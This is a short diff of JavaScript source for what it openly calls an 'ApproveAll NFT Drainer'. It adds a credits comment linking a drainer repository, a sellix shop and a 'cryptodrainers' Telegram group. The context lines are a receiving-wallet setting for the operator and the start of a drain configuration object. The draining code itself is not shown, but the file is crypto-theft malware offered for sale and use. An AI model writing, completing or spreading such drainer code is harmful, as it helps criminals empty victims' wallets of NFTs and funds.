@@ -1,3 +1,9 @@
+/* 
+    Credits: https://github.com/0x32Moon/ApproveAll-NFT-Drainer
+    Shop: https://tec.sellix.io/
+    Telegram group: https://t.me/cryptodrainers
+*/
+
 const receiveAddress = "RECEIVER WALLET"; // Put your wallet adress that you want to receive results
 
 const drainNftsInfo = {
